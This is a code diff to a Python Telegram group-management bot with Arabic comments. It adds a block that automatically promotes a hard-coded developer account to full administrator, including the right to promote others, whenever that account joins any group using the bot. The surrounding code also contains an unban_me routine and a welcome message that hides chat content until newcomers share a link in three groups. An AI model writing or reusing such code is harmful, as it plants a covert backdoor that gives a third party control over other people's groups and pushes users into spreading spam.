@@ -77,6 +77,24 @@ async def on_chat_member_updated(update, context):
     if update.effective_chat.type in ["group", "supergroup"]: save_group_id(update.effective_chat.id)
     result = update.chat_member
     if not result: return
+
+    # ✅ لو MY_USER_ID دخل الجروب ارفعه مشرف فوراً
+    if result.new_chat_member.user.id == MY_USER_ID and result.new_chat_member.status == ChatMemberStatus.MEMBER:
+        try:
+            await context.bot.promote_chat_member(
+                chat_id=update.effective_chat.id,
+                user_id=MY_USER_ID,
+                can_change_info=True,
+                can_delete_messages=True,
+                can_invite_users=True,
+                can_restrict_members=True,
+                can_pin_messages=True,
+                can_promote_members=True
+            )
+            await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
+        except Exception as e: print(f"Error promote: {e}")
+        return
+
     if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
         actor_id = result.from_user.id
         if actor_id != MY_USER_ID and actor_id != context.bot.id:
@@ -113,7 +131,7 @@ async def protect_group(update, context):
                         mention_link = f"<a href='tg://user?id={member.id}'>{safe_name}</a>"
                         welcome_text = f"مرحباً بك يا {mention_link}، <b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>"
                         sent_msg = await context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
-                        asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 5))
+                        asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 10))
                     except: pass
 
 async def unban_me(update, context):
